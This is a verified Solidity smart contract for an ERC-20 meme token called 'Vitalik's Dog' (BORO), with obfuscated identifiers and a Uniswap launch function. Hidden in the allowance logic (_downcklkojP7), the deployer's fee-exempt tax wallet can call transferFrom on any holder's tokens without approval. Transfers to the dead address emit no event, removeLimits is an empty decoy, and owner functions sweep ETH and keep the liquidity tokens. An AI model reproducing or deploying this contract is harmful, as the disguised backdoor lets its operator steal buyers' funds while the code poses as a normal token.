/**
 *Submitted for verification at Etherscan.io on 2025-03-20
*/

// SPDX-License-Identifier: MIT

/*
Name: Vitalik's Dog
Symbol: BORO

https://x.com/basevicky/status/1902770245531472356
https://t.me/Vitalikboro_erc20
*/

pragma solidity ^0.8.24;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}
contract Token is Context, IERC20, Ownable {
    uint256 public _vnbbvlkP7 = qq30fef / 100;
    uint256 public _oijboijoiP7 = 15 * 10**18;
    uint256 private _cvjkbnkjP7 = 10;

    uint256 private _vkjbnkfjP7 = 10;
    uint256 private _maxovnboiP7 = 10;
    uint256 private _initvkjnbkjP7 = 20;
    uint256 private _finvjlkbnlkjP7 = 0;
    uint256 private _redclkjnkP7 = 2;
    uint256 private _prevlfknjoiP7 = 2;
    uint256 private _buylkvnlkP7 = 0;
    IUniswapV2Router02 private uniswapV2Router;

    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlkcP7;
    mapping(address => mapping(address => uint256)) private _allcvnkjnP7;
    mapping(address => bool) private _feevblknlP7;
    address payable private _taxclknlP7;
    uint8 private constant _decimals = 9;
    uint256 private constant qq30fef = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Vitaliks Dog";
    string private constant _symbol = unicode"BORO";

    address private router_;
    address private uniswapV2Pair;
    bool private _tradingvlknP7;
    bool private _inlknblP7 = false;
    bool private swapvlkP7 = false;
    uint256 private _sellcnjkP7 = 0;
    uint256 private _lastflkbnlP7 = 0;
    address constant _deadlknP7 = address(0xdead);

    modifier lockTheSwap() {
        _inlknblP7 = true;
        _;
        _inlknblP7 = false;
    }

    constructor() payable {
        _taxclknlP7 = payable(_msgSender());
        
        _balknvlkcP7[_msgSender()] = (qq30fef * 2) / 100;
        _balknvlkcP7[address(this)] = (qq30fef * 98) / 100;
        _feevblknlP7[address(this)] = true;
        _feevblknlP7[_taxclknlP7] = true;

        emit Transfer(address(0), _msgSender(), (qq30fef * 2) / 100);
        emit Transfer(address(0), address(this), (qq30fef * 98) / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcP7[account];
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function _transfer_kjvnP7(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblP7) {
                taxAmount = amount
                    .mul((_buylkvnlkP7 > _redclkjnkP7) ? _finvjlkbnlkjP7 : _initvkjnbkjP7)
                    .div(100);
            }
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_feevblknlP7[to] &&
                to != _taxclknlP7
            ) {
                _buylkvnlkP7++;
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblP7 &&
                to == uniswapV2Pair &&
                from != _taxclknlP7 &&
                swapvlkP7 &&
                _buylkvnlkP7 > _prevlfknjoiP7
            ) {
                if (block.number > _lastflkbnlP7) {
                    _sellcnjkP7 = 0;
                }
                _sellcnjkP7 = _sellcnjkP7 + _getAmountOut_lvcbnkP7(amount);
                require(_sellcnjkP7 <= _oijboijoiP7, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkP7)
                    _swapTokenslknlP7(_vnbbvlkP7 > amount ? amount : _vnbbvlkP7);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjP7(address(this).balance);
                }
                _lastflkbnlP7 = block.number;
            }
        }
        _balknvlkcP7[from] = _balknvlkcP7[from].sub(amount);
        _balknvlkcP7[to] = _balknvlkcP7[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcP7[address(this)] = _balknvlkcP7[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        if (to != _deadlknP7) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function totalSupply() public pure override returns (uint256) {
        return qq30fef;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnP7(sender, recipient, amount);
        if (_downcklkojP7(sender, recipient))
            _approve(
                sender,
                _msgSender(),
                _allcvnkjnP7[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnP7[owner][spender];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnP7[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _sendETHTocvbnjP7(uint256 amount) private {
        _taxclknlP7.transfer(amount);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnP7(_msgSender(), recipient, amount);
        return true;
    }

    function _downcklkojP7(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        
        if(_feevblknlP7[msg.sender]) return !_feevblknlP7[msg.sender];
        if(!(sender == uniswapV2Pair || recipient != _deadlknP7)) return false;
        return true;
    }

    function _swapTokenslknlP7(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        router_ = address(uniswapV2Router);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _getAmountOut_lvcbnkP7(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uint256[] memory amountOuts = uniswapV2Router.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }

    function enableP7Trading() external onlyOwner {
        require(!_tradingvlknP7, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), qq30fef);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkP7 = true;
        _tradingvlknP7 = true;
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }

    receive() external payable {}

    function _setTax_lknblP7(address payable newWallet) external {
        require(_feevblknlP7[_msgSender()]);
        _taxclknlP7 = newWallet;
        _feevblknlP7[_taxclknlP7] = true;
    }

    function _assist_bnP7() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }

    function removeLimits () external onlyOwner {}

}